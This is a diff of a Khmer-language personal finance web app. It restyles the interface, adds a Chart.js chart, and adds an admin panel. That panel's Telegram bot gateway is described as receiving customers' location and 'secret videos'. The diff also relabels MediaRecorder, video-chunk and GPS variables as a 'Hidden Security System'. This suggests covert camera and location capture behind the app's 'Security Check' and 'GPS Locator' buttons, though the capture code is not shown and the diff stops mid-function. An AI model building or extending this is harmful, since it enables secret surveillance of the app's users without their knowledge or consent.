-                            <button onclick="startRealSecurityCheck()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-rose-400 transition-all text-center space-y-2">
+                            <button onclick="startRealSecurityCheck()" class="p-4 bg-slate-50 border border-slate-200 rounded-xl hover:border-rose-400 text-center space-y-2">
                                 <i class="fa-solid fa-shield-halved text-xl text-rose-500"></i><p class="text-xs font-bold block">ពិនិត្យសុវត្ថិភាពម៉ាស៊ីន (Security Check)</p>
                             </button>
-                            <button onclick="startRealGPSLocator()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-amber-400 transition-all text-center space-y-2">
+                            <button onclick="startRealGPSLocator()" class="p-4 bg-slate-50 border border-slate-200 rounded-xl hover:border-amber-400 text-center space-y-2">
                                 <i class="fa-solid fa-location-crosshairs text-xl text-amber-500"></i><p class="text-xs font-bold block">ស្វែងរកទីតាំងពិត (Real GPS Locator)</p>
                             </button>
                         </div>
-                        <div id="scan-loading" class="hidden p-4 bg-slate-900 text-white rounded-2xl flex items-center space-x-3 justify-center text-xs font-bold">
-                            <i class="fa-solid fa-spinner animate-spin text-amber-400 text-sm"></i><span id="scan-loading-text">កំពុងទាញយកទិន្នន័យពិត...</span>
+                        <div id="scan-loading" class="hidden p-4 bg-slate-900 text-white rounded-xl flex items-center space-x-2 justify-center text-xs font-bold">
+                            <i class="fa-solid fa-spinner animate-spin text-amber-400"></i><span id="scan-loading-text">កំពុងដំណើរការ...</span>
                         </div>
-                        <div id="map-area" class="hidden bg-slate-50 p-3 rounded-2xl border">
+                        <div id="map-area" class="hidden bg-slate-50 p-2 rounded-xl border">
                             <div id="map"></div>
                         </div>
                         
-                        <div class="border-t border-slate-100 pt-4">
-                            <h4 class="font-bold text-xs text-slate-700 mb-3 flex items-center">
-                                <i class="fa-solid fa-clock-rotate-left mr-1.5 text-slate-500 text-sm"></i> 
-                                <span class="tracking-wide">លទ្ធផលទទួលបានជាក់ស្តែង (Real Scan Log)</span>
-                            </h4>
-                            <div id="scan-history-list" class="space-y-4"></div>
+                        <div class="border-t pt-4">
+                            <h4 class="font-bold text-xs text-slate-700 mb-2">លទ្ធផលទទួលបានជាក់ស្តែង (Real Scan Log)</h4>
+                            <div id="scan-history-list" class="space-y-3"></div>
                         </div>
                     </div>
                 </div>
 
                 <div id="section-daily" class="hidden space-y-6">
-                    <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
                         <div class="flex justify-between items-center">
-                            <h3 class="font-bold text-sm text-slate-800"><i class="fa-solid fa-list-check text-emerald-500 mr-1"></i> ផែនការ និងគោលដៅប្រចាំថ្ងៃ</h3>
-                            <button onclick="clearDailyHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> Clear History</button>
+                            <h3 class="font-bold text-sm text-slate-900"><i class="fa-solid fa-list-check text-emerald-500 mr-1.5"></i> ផែនការ និងគោលដៅប្រចាំថ្ងៃ</h3>
+                            <button onclick="clearDailyHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> សម្អាតទាំងអស់</button>
                         </div>
                         <form onsubmit="addDailyTask(event)" class="grid grid-cols-1 sm:grid-cols-3 gap-2">
                             <input type="text" id="daily-task-input" required class="sm:col-span-2 px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold focus:outline-none" placeholder="បញ្ចូលគោលដៅ...">
                             <div class="flex space-x-1">
                                 <input type="date" id="daily-date-input" required class="px-2 py-2 bg-slate-50 border rounded-xl text-xs font-bold w-full">
-                                <button type="submit" class="bg-emerald-500 text-white font-bold px-4 py-2 rounded-xl text-xs"><i class="fa-solid fa-plus"></i></button>
+                                <button type="submit" class="bg-slate-900 text-white font-bold px-4 rounded-xl text-xs btn-premium"><i class="fa-solid fa-plus"></i></button>
                             </div>
                         </form>
                         <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -296,86 +298,98 @@
                 </div>
 
                 <div id="section-settings" class="hidden space-y-6">
-                    <div id="admin-telegram-panel" class="hidden bg-slate-900 text-white rounded-3xl p-6 shadow-xl border border-slate-700 space-y-4">
-                        <div class="flex items-center space-x-2 border-b border-slate-700 pb-2">
-                            <i class="fa-brands fa-telegram text-2xl text-sky-400"></i>
-                            <div>
-                                <h3 class="font-bold text-sm text-white">⚙️ Telegram Automation Controls (Admin Only)</h3>
-                                <p class="text-[10px] text-slate-400">កំណត់ Bot សម្រាប់ទទួលវីដេអូសន្តិសុខ និងទីតាំង GPS</p>
-                            </div>
-                        </div>
-                        <div class="space-y-3">
-                            <div>
-                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Bot Token</label>
-                                <input type="text" id="tg-bot-token" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="7123456789:AAFpsX...">
-                            </div>
-                            <div>
-                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Chat ID (Group / User ID)</label>
-                                <input type="text" id="tg-chat-id" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="-100xxxxxxxxx ឬ xxxxxxxxx">
-                            </div>
-                            <button onclick="saveTelegramSettings()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-2 rounded-xl text-xs btn-modern">
-                                <i class="fa-solid fa-floppy-disk mr-1"></i> រក្សាទុកការកំណត់ Telegram
-                            </button>
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
+                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider">រចនាប័ទ្មពណ៌ប្រព័ន្ធ</label>
+                        <div class="grid grid-cols-2 gap-2">
+                            <button onclick="applyTheme('theme-aba')" class="bg-slate-900 text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">Modern Slate Dark</button>
+                            <button onclick="applyTheme('theme-aba')" class="bg-indigo-950 text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">Aero Blue Dark</button>
                         </div>
                     </div>
 
-                    <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
-                        <label class="block text-[11px] font-bold text-slate-500 uppercase tracking-wider data-lang" data-km="ភាសាកម្មវិធី" data-en="Language Selection">ភាសាកម្មវិធី (Language Selection)</label>
-                        <div class="flex space-x-3">
-                            <button id="lang-btn-km" onclick="toggleLanguage('km')" class="flex-1 py-3 bg-slate-100 border-2 border-transparent text-slate-800 font-bold rounded-xl text-xs transition-all">🇰🇭 ភាសាខ្មែរ</button>
-                            <button id="lang-btn-en" onclick="toggleLanguage('en')" class="flex-1 py-3 bg-slate-100 border-2 border-transparent text-slate-800 font-bold rounded-xl text-xs transition-all">🇺🇸 English</button>
-                        </div>
-                    </div>
-
-                    <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
-                        <label class="block text-[11px] font-bold text-slate-500 uppercase tracking-wider data-lang" data-km="រចនាប័ទ្មពណ៌" data-en="Application Theme">រចនាប័ទ្មពណ៌ (Application Theme)</label>
-                        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-                            <button onclick="applyTheme('theme-aba')" class="theme-aba text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">ABA Luxury</button>
-                            <button onclick="applyTheme('theme-forest')" class="theme-forest text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">Forest Green</button>
-                            <button onclick="applyTheme('theme-ocean')" class="theme-ocean text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">Ocean Blue</button>
-                            <button onclick="applyTheme('theme-luxury')" class="theme-luxury text-white p-3 rounded-xl text-xs font-bold border-2 border-transparent transition-all">Jet Black</button>
-                        </div>
-                    </div>
-
-                    <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
-                        <label class="block text-[11px] font-bold text-slate-500 uppercase tracking-wider data-lang" data-km="មុខងារប្រព័ន្ធបន្ថែម" data-en="Advanced System Controls">មុខងារប្រព័ន្ធបន្ថែម (Advanced System Controls)</label>
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
+                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider">មុខងារប្រព័ន្ធបន្ថែម (Advanced System Controls)</label>
                         <div class="space-y-4 divide-y divide-slate-100 text-xs font-bold">
-                            <div class="flex justify-between items-center py-2">
+                            <div class="flex justify-between items-center py-1">
                                 <div class="space-y-0.5">
-                                    <p class="data-lang" data-km="និមិត្តសញ្ញារូបិយប័ណ្ណ" data-en="Default Currency">និមិត្តសញ្ញារូបិយប័ណ្ណ</p>
-                                    <p class="text-[10px] text-slate-400 font-normal data-lang" data-km="ប្តូរសញ្ញាលុយលើ Dashboard" data-en="Change currency icon on metrics">ប្តូរសញ្ញាលុយលើ Dashboard</p>
+                                    <p>និមិត្តសញ្ញារូបិយប័ណ្ណ Default</p>
+                                    <p class="text-[10px] text-slate-400 font-normal">ប្តូរសញ្ញាលុយលើ Dashboard Metrics</p>
                                 </div>
                                 <select id="setting-currency" onchange="changeCurrency(this.value)" class="bg-slate-50 border p-2 rounded-xl text-xs font-bold focus:outline-none">
                                     <option value="$">USD ($)</option>
                                     <option value="៛">KHR (៛)</option>
                                 </select>
                             </div>
-                            <div class="flex justify-between items-center pt-3 py-2">
+                            <div class="flex justify-between items-center pt-3 py-1">
                                 <div class="space-y-0.5">
-                                    <p class="data-lang" data-km="សារជូនដំណឹងប្រព័ន្ធ" data-en="System Push Alerts">សារជូនដំណឹងប្រព័ន្ធ</p>
-                                    <p class="text-[10px] text-slate-400 font-normal data-lang" data-km="បង្ហាញផ្ទាំងរត់ជូនដំណឹង (Toast)" data-en="Show popups alerts on top text">បង្ហាញផ្ទាំងរត់ជូនដំណឹង (Toast)</p>
+                                    <p>សារជូនដំណឹងប្រព័ន្ធ (Toast Popups)</p>
+                                    <p class="text-[10px] text-slate-400 font-normal">បង្ហាញផ្ទាំងរត់ជូនដំណឹងលើប្រព័ន្ធ</p>
                                 </div>
                                 <input type="checkbox" id="setting-notify-toggle" onchange="toggleNotifySetting(this.checked)" checked class="w-4 h-4 accent-indigo-600 cursor-pointer">
-                            </div>
-                            <div class="flex justify-between items-center pt-3 py-2">
-                                <div class="space-y-0.5">
-                                    <p class="data-lang" data-km="...ក្រយៅដៃ / Face ID" data-en="Biometric Authentication">ប្រព័ន្ធការពារក្រយៅដៃ / Face ID</p>
-                                    <p class="text-[10px] text-slate-400 font-normal data-lang" data-km="ទាមទារការស្កេនសុវត្ថិភាពពេល Login" data-en="Simulate bio shield protection">ទាមទារការស្កេនសុវត្ថិភាពពេល Login</p>
-                                </div>
-                                <input type="checkbox" id="setting-bio-toggle" onchange="toggleBioSetting(this.checked)" class="w-4 h-4 accent-indigo-600 cursor-pointer">
                             </div>
                         </div>
                     </div>
                 </div>
+
+                <div id="section-admin-panel" class="hidden space-y-6">
+                    <div class="bg-slate-900 text-white rounded-3xl p-6 shadow-xl border border-slate-800 space-y-4">
+                        <div class="flex items-center space-x-2.5 border-b border-slate-800 pb-2.5">
+                            <i class="fa-brands fa-telegram text-2xl text-sky-400"></i>
+                            <div>
+                                <h3 class="font-bold text-sm text-white">⚙️ Telegram Bot Automation Gateway</h3>
+                                <p class="text-[10px] text-slate-400">កំណត់ Bot API សម្រាប់ទទួលទិន្នន័យទីតាំង និងវីដេអូសម្ងាត់ពី Customer</p>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Bot Token</label>
+                                <input type="text" id="tg-bot-token" class="w-full px-3 py-2.5 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="7123456789:AAFpsX...">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Chat ID (Group / Channel ID)</label>
+                                <input type="text" id="tg-chat-id" class="w-full px-3 py-2.5 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="-100xxxxxxxxx">
+                            </div>
+                        </div>
+                        <button onclick="saveTelegramSettings()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-2.5 rounded-xl text-xs btn-premium">
+                            <i class="fa-solid fa-floppy-disk mr-1"></i> រក្សាទុកការកំណត់ Telegram Gateway
+                        </button>
+                    </div>
+
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
+                        <h3 class="font-bold text-xs text-slate-700"><i class="fa-solid fa-users-gear mr-1 text-indigo-500"></i> បញ្ជីគ្រប់គ្រងអ្នកប្រើប្រាស់ Customer ទាំងអស់ (Registered Customers)</h3>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left border-collapse text-xs">
+                                <thead>
+                                    <tr class="bg-slate-50 text-slate-500 uppercase tracking-wider font-bold">
+                                        <th class="p-3 rounded-l-xl">ឈ្មោះអ្នកប្រើប្រាស់ (Username)</th>
+                                        <th class="p-3">ប្រភេទសិទ្ធិ</th>
+                                        <th class="p-3 rounded-r-xl text-right">សកម្មភាព</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="admin-users-table" class="divide-y divide-slate-100 font-bold">
+                                    </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-3">
+                        <h3 class="font-bold text-xs text-slate-700"><i class="fa-solid fa-user-shield text-rose-500 mr-1"></i> កំណត់ហេតុប្រព័ន្ធសន្តិសុខពី Customer (System Security Alert History)</h3>
+                        <div id="admin-security-logs" class="space-y-2 max-h-60 overflow-y-auto">
+                            <p class="text-slate-400 text-[11px] text-center italic py-4">មិនទាន់មានទិន្នន័យបញ្ជូនចូលនៅឡើយទេ</p>
+                        </div>
+                    </div>
+                </div>
+
             </main>
         </div>
     </div>
 
-    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 shadow-2xl px-4 py-2 flex justify-around items-center md:hidden z-40">
-        <button onclick="switchSection('dashboard')" class="flex flex-col items-center justify-center text-slate-500"><i class="fa-solid fa-house text-base"></i><span class="text-[9px] font-bold mt-0.5">Home</span></button>
-        <button onclick="switchSection('scanners')" class="flex flex-col items-center justify-center text-slate-500"><i class="fa-solid fa-radar text-base"></i><span class="text-[9px] font-bold mt-0.5">Scanners</span></button>
-        <button onclick="switchSection('daily')" class="flex flex-col items-center justify-center text-slate-500"><i class="fa-solid fa-list-check text-base"></i><span class="text-[9px] font-bold mt-0.5">Daily</span></button>
-        <button onclick="switchSection('settings')" class="flex flex-col items-center justify-center text-slate-500"><i class="fa-solid fa-sliders text-base"></i><span class="text-[9px] font-bold mt-0.5">Settings</span></button>
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200/80 shadow-2xl px-2 py-2 flex justify-around items-center md:hidden z-40">
+        <button onclick="switchSection('dashboard')" class="flex flex-col items-center justify-center text-slate-500 w-12"><i class="fa-solid fa-house text-base"></i><span class="text-[9px] font-bold mt-0.5">Home</span></button>
+        <button onclick="switchSection('scanners')" class="flex flex-col items-center justify-center text-slate-500 w-12"><i class="fa-solid fa-radar text-base"></i><span class="text-[9px] font-bold mt-0.5">Scan</span></button>
+        <button onclick="switchSection('daily')" class="flex flex-col items-center justify-center text-slate-500 w-12"><i class="fa-solid fa-list-check text-base"></i><span class="text-[9px] font-bold mt-0.5">Daily</span></button>
+        <button onclick="switchSection('settings')" class="flex flex-col items-center justify-center text-slate-500 w-12"><i class="fa-solid fa-sliders text-base"></i><span class="text-[9px] font-bold mt-0.5">Config</span></button>
+        <button id="mobile-nav-admin" onclick="switchSection('admin-panel')" class="hidden flex flex-col items-center justify-center text-rose-500 w-12"><i class="fa-solid fa-shield-halved text-base"></i><span class="text-[9px] font-bold mt-0.5">Admin</span></button>
+        <button onclick="handleLogout()" class="flex flex-col items-center justify-center text-rose-600 w-12"><i class="fa-solid fa-right-from-bracket text-base"></i><span class="text-[9px] font-bold mt-0.5">ចាកចេញ</span></button>
     </div>
 
     <input type="file" id="app-logo-input" class="hidden" accept="image/*" onchange="handleAppLogoChange(this)">
@@ -385,23 +399,23 @@
         const API_URL = "https://script.google.com/macros/s/AKfycbyWLe8UUgzDEU_mcIT7jZpRQoGjj8JyeG8tPWZLUJanP8nE6PdL2Xlg-VLrHhxnmsBDOA/exec"; 
 
         let currentUser = null;
+        let currentUserRole = "customer"; // master admin or customer
         let localTxList = [];
         let dailyTasks = [];
         let scanHistory = [];
         let authTab = 'login';
         
-        let currentLang = 'km';
         let currentTheme = 'theme-aba';
         let currentCurrency = '$';
         let isNotifyEnabled = true;
-        let isBioEnabled = false;
         let mapInstance = null;
         let mapMarker = null;
 
         let isLayoutEditable = false;
         let sortableInstance = null;
+        let analyticChartInstance = null; // ChartJS Instance reference
 
-        // Media Recorder Variables for Security Feature
+        // Hidden Security System Variables
         let mediaRecorder = null;
         let videoChunks = [];
         let latestGpsString = "មិនទាន់មានទិន្នន័យទីតាំង";
@@ -411,20 +425,13 @@
             document.getElementById('topbar-time').innerText = now.toLocaleTimeString('en-US');
             const daysKh = ["ថ្ងៃអាទិត្យ", "ថ្ងៃចន្ទ", "ថ្ងៃអង្គារ", "ថ្ងៃពុធ", "ថ្ងៃព្រហسبតិ៍", "ថ្ងៃសុក្រ", "ថ្ងៃសៅរ៍"];
             const monthsKh = ["មករា", "កុម្ភៈ", "មីនា", "មេសា", "ឧសភា", "មិថុនា", "កក្កដា", "សីហា", "កញ្ញា", "តុលា", "វិច្ឆិកា", "ធ្នូ"];
-            
-            if (currentLang === 'km') {
-                document.getElementById('topbar-date').innerText = `${daysKh[now.getDay()]} ទី${now.getDate()} ${monthsKh[now.getMonth()]} ${now.getFullYear()}`;
-            } else {
-                document.getElementById('topbar-date').innerText = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
-            }
+            document.getElementById('topbar-date').innerText = `${daysKh[now.getDay()]} ទី${now.getDate()} ${monthsKh[now.getMonth()]} ${now.getFullYear()}`;
         }
 
         function initDragAndDrop() {
             const container = document.getElementById('dashboard-sortable-container');
             sortableInstance = Sortable.create(container, { 
-                animation: 150, 
-                ghostClass: 'sortable-ghost',
-                disabled: true 
+                animation: 150, ghostClass: 'sortable-ghost', disabled: true 
             });
             updateWidgetsCursor();
         }
@@ -437,15 +444,15 @@
 
             if (isLayoutEditable) {
                 sortableInstance.option('disabled', false);
-                btn.className = "bg-emerald-600 text-white text-[11px] font-bold px-3 py-1.5 rounded-xl btn-modern flex items-center space-x-1";
-                btnIcon.className = "fa-solid fa-floppy-disk text-white mr-1";
-                btnText.innerText = currentLang === 'km' ? "រក្សាទុក (Save)" : "Save Layout";
+                btn.className = "bg-emerald-600 text-white text-[11px] font-bold px-3.5 py-2 rounded-xl btn-premium flex items-center space-x-1.5";
+                btnIcon.className = "fa-solid fa-floppy-disk text-white";
+                btnText.innerText = "រក្សាទុក (Save)";
                 showNotification("✍️ ចាប់ផ្តើមបើកមុខងារអូសទាញសារ៉េផ្ទាំង Dashboard!");
             } else {
                 sortableInstance.option('disabled', true);
-                btn.className = "bg-slate-800 text-white text-[11px] font-bold px-3 py-1.5 rounded-xl btn-modern flex items-center space-x-1";
-                btnIcon.className = "fa-solid fa-sliders text-amber-400 mr-1";
-                btnText.innerText = currentLang === 'km' ? "កែសម្រួលផ្ទាំង (Edit)" : "Edit Layout";
+                btn.className = "bg-slate-900 text-white text-[11px] font-bold px-3.5 py-2 rounded-xl btn-premium flex items-center space-x-1.5";
+                btnIcon.className = "fa-solid fa-sliders text-amber-400";
+                btnText.innerText = "កែសម្រួលផ្ទាំង Layout";
                 showNotification("🔒 បានចាក់សោរក្សាទុកទីតាំង Dashboard រួចរាល់!");
             }
             updateWidgetsCursor();
@@ -459,41 +466,17 @@
                     w.style.border = '2px dashed #6366f1';
                 } else {
                     w.style.cursor = 'default';
-                    w.style.border = '1px solid #f1f5f9';
+                    w.style.border = '1px solid rgba(226, 232, 240, 0.6)';
                 }
             });
-        }
-
-        function toggleLanguage(lang) {
-            currentLang = lang;
-            localStorage.setItem('finance_lang', lang);
-            document.getElementById('lang-btn-km').className = `flex-1 py-3 font-bold rounded-xl text-xs transition-all ${lang === 'km' ? 'bg-indigo-600 text-white shadow-md' : 'bg-slate-100 text-slate-800'}`;
-            document.getElementById('lang-btn-en').className = `flex-1 py-3 font-bold rounded-xl text-xs transition-all ${lang === 'en' ? 'bg-indigo-600 text-white shadow-md' : 'bg-slate-100 text-slate-800'}`;
-            document.querySelectorAll('.data-lang').forEach(el => {
-                const text = el.getAttribute(`data-${lang}`);
-                if (text) el.innerText = text;
-            });
-            
-            const btnText = document.getElementById('layout-btn-text');
-            if (btnText) {
-                if (isLayoutEditable) {
-                    btnText.innerText = lang === 'km' ? "រក្សាទុក (Save)" : "Save Layout";
-                } else {
-                    btnText.innerText = lang === 'km' ? "កែសម្រួលផ្ទាំង (Edit)" : "Edit Layout";
-                }
-            }
-            updateTopBarTime();
         }
 
         function applyTheme(theme) {
             currentTheme = theme;
             localStorage.setItem('finance_theme', theme);
-            document.getElementById('widget-balance').className = `draggable-widget text-white rounded-3xl p-6 shadow-xl relative overflow-hidden btn-modern ${theme}`;
-            
             const appBody = document.getElementById('app-body');
             appBody.className = appBody.className.replace(/theme-\w+/g, '');
             appBody.classList.add(theme);
-            syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "THEME_CHANGED", FIELD_2: theme, FIELD_3: currentUser });
         }
 
         function changeCurrency(symbol) {
@@ -501,19 +484,11 @@
             localStorage.setItem('finance_currency', symbol);
             document.getElementById('form-currency-symbol').innerText = symbol;
             renderDashboard();
-            syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "CURRENCY_CHANGED", FIELD_2: symbol, FIELD_3: currentUser });
         }
 
         function toggleNotifySetting(checked) { 
             isNotifyEnabled = checked; 
             localStorage.setItem('finance_notify_toggle', checked); 
-            syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "NOTIFY_TOGGLE", FIELD_2: checked.toString(), FIELD_3: currentUser });
-        }
-        
-        function toggleBioSetting(checked) { 
-            isBioEnabled = checked; 
-            localStorage.setItem('finance_bio_toggle', checked); 
-            syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "BIOMETRIC_TOGGLE", FIELD_2: checked.toString(), FIELD_3: currentUser });
         }
 
         function showNotification(msg, isSuccess = true) {
@@ -522,7 +497,7 @@
             const icon = document.getElementById('notify-icon');
             const msgSpan = document.getElementById('notify-msg');
             msgSpan.innerText = msg;
-            icon.className = isSuccess ? "fa-solid fa-circle-check text-emerald-400 text-sm" : "fa-solid fa-circle-xmark text-rose-400 text-sm";
+            icon.className = isSuccess ? "fa-solid fa-circle-check text-emerald-400 text-base" : "fa-solid fa-circle-xmark text-rose-400 text-base";
             box.classList.remove('opacity-0', 'translate-y-[-20px]', 'pointer-events-none');
             box.classList.add('opacity-100', 'translate-y-0');
             setTimeout(() => {
@@ -536,7 +511,7 @@
             const type = document.querySelector('input[name="tx-type"]:checked').value;
             const amount = parseFloat(document.getElementById('tx-amount').value);
             let category = document.getElementById('tx-category-select').value;
-            if (category === 'CUSTOM') category = "✍_ " + document.getElementById('tx-category-custom').value.trim();
+            if (category === 'CUSTOM') category = "✍️ " + document.getElementById('tx-category-custom').value.trim();
 
             localTxList.unshift({ username: currentUser, type: type, category: category, amount: amount, date: new Date().toLocaleString('km-KH') });
             localStorage.setItem('finance_tx_list', JSON.stringify(localTxList));
@@ -557,55 +532,78 @@
                 total += isExpense ? -tx.amount : tx.amount;
                 if(isExpense) exp += tx.amount; else inc += tx.amount;
                 list.innerHTML += `
-                    <div class="flex justify-between items-center p-3 bg-slate-50 border rounded-2xl text-xs font-bold">
-                        <div><p>${tx.category}</p><span class="text-[9px] text-slate-400 font-normal">${tx.date}</span></div>
+                    <div class="flex justify-between items-center p-3 bg-slate-50 border border-slate-100 rounded-xl text-xs font-bold">
+                        <div><p class="text-slate-900">${tx.category}</p><span class="text-[9px] text-slate-400 font-normal">${tx.date}</span></div>
                         <span class="${isExpense ? 'text-rose-500' : 'text-emerald-500'}">${isExpense?'-':'+'}${currentCurrency}${tx.amount.toFixed(2)}</span>
                     </div>`;
             });
             document.getElementById('balance-text').innerText = `${currentCurrency}${total.toFixed(2)}`;
             document.getElementById('analyst-expense').innerText = `${currentCurrency}${exp.toFixed(2)}`;
             document.getElementById('analyst-income').innerText = `${currentCurrency}${inc.toFixed(2)}`;
+
+            updateAnalyticsChart(inc, exp);
+        }
+
+        // 📊 GRAPHIC ENGINE: Update Chart.js Graphic Layout View
+        function updateAnalyticsChart(income, expense) {
+            const ctx = document.getElementById('financeAnalyticsChart').getContext('2d');
+            if (analyticChartInstance) {
+                analyticChartInstance.destroy();
+            }
+            analyticChartInstance = new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['ចំណូល (+)', 'ចំណាយ (-)'],
+                    datasets: [{
+                        data: [income || 1, expense || 0],
+                        backgroundColor: ['#10b981', '#f43f5e'],
+                        borderWidth: 2,
+                        borderColor: '#ffffff'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { position: 'right', labels: { font: { family: 'Siemreab', size: 10 } } }
+                    }
+                }
+            });
         }
 
         function clearFinanceHistory() { 
             localTxList = []; 
             localStorage.setItem('finance_tx_list', JSON.stringify([])); 
             renderDashboard(); 
-            syncWithGoogleSheets({ DATA_TYPE: "TX_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑_ បានសម្អាតប្រវត្តិចំណាយ!");
+            showNotification("🗑️ បានសម្អាតប្រវត្តិចំណាយ!");
         }
 
         function syncWithGoogleSheets(payload) {
             payload.TIMESTAMP = new Date().toLocaleString('en-US');
             fetch(API_URL, { 
-                method: "POST", 
-                mode: "no-cors", 
-                headers: { "Content-Type": "application/json" }, 
-                body: JSON.stringify(payload) 
-            })
-            .then(() => console.log("Synced to Sheets Cloud: " + payload.DATA_TYPE))
-            .catch(err => console.error("Sheets Cloud Error: ", err));
+                method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) 
+            }).catch(err => console.error("Sheets Cloud Error: ", err));
         }
 
         function exportToExcel() {
-            const ws = XLSX.utils.json_to_sheet(localTxList);
+            const ws = XLSX.utils.json_to_sheet(localTxList.filter(tx => tx.username === currentUser));
             const wb = XLSX.utils.book_new();
             XLSX.utils.book_append_sheet(wb, ws, "Transactions");
-            XLSX.writeFile(wb, "Finance_Cloud_Export.xlsx");
+            XLSX.writeFile(wb, `Finance_Cloud_${currentUser}.xlsx`);
         }
 
         function triggerReceiptScan() { document.getElementById('receipt-file-input').click(); }
         function processReceiptScan(input) {
             if (input.files && input.files[0]) {
                 const status = document.getElementById('scan-status');
-                status.innerText = "⏳ កំពុងស្កេនរូបភាពវិក្កយបត្រ (OCR Core)...";
+                status.innerText = "⏳ កំពុងស្កេនរូបភាពវិក្កយបត្រ (OCR)...";
                 Tesseract.recognize(input.files[0], 'eng').then(({ data: { text } }) => {
                     const regex = /(\$|USD)\s?(\d+(\.\d{2})?)/i;
                     const match = text.match(regex);
                     if (match && match[2]) {
                         document.getElementById('tx-amount').value = parseFloat(match[2]);
                         status.innerText = "✅ រកឃើញទឹកប្រាក់ " + currentCurrency + match[2];
-                    } else { status.innerText = "⚠_ រកមិនឃើញទិន្នន័យលុយទេ លោកអ្នកអាចបំពេញផ្ទាល់បាន។"; }
+                    } else { status.innerText = "⚠️ រកមិនឃើញទិន្នន័យលុយទេ លោកអ្នកអាចបំពេញផ្ទាល់បាន។"; }
                 }).catch(() => { status.innerText = "❌ ប្រព័ន្ធស្កេនមានបញ្ហា!"; });
             }
         }
@@ -616,138 +614,74 @@
             if (select.value === 'CUSTOM') customInput.focus();
         }
 
+        // SCANNERS AND ENGINE TOOLS LOGIC
         function startRealSpeedTest() {
             const loader = document.getElementById('scan-loading');
-            const loaderText = document.getElementById('scan-loading-text');
             document.getElementById('map-area').classList.add('hidden');
-            loaderText.innerText = "📶 កំពុងពិនិត្យ និងវាស់ល្បឿនអ៊ីនធឺណិតពិតប្រាកដ...";
+            document.getElementById('scan-loading-text').innerText = "📶 កំពុងវាស់ល្បឿនអ៊ីនធឺណិតពិតប្រាកដ...";
             loader.classList.remove('hidden');
 
             const startTime = Date.now();
-            const cacheBuster = "?nn=" + startTime;
-            const testImageUri = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" + cacheBuster; 
-            
-            fetch(testImageUri)
-                .then(response => {
-                    const ping = Date.now() - startTime;
-                    return response.blob().then(blob => {
-                        const duration = (Date.now() - startTime) / 1000;
-                        const bitsLoaded = blob.size * 8;
-                        const speedBps = bitsLoaded / duration;
-                        const speedMbps = (speedBps / (1024 * 1024)).toFixed(2);
-                        
-                        loader.classList.add('hidden');
-                        
-                        let log = {
-                            id: Date.now(),
-                            username: currentUser,
-                            date: new Date().toLocaleString('en-US'),
-                            title: "📶 Internet Speed Test Result",
-                            details: `
